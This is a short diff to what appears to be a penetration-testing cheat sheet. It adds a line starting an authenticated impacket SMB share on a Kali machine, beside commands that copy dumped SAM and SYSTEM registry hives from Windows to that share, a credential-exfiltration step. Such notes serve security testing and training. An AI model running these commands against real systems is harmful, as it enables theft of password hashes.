@@ -100,6 +100,7 @@ http://IP:8000
 
 # Windows -> Kali
 impacket-smbserver -smb2support test .
+impacket-smbserver -smb2support monshare . -username "mon.user" -password "monpassword"
 copy sam.save \\kali\test\sam.save
 copy system.save \\kali\test\system.save
 ```
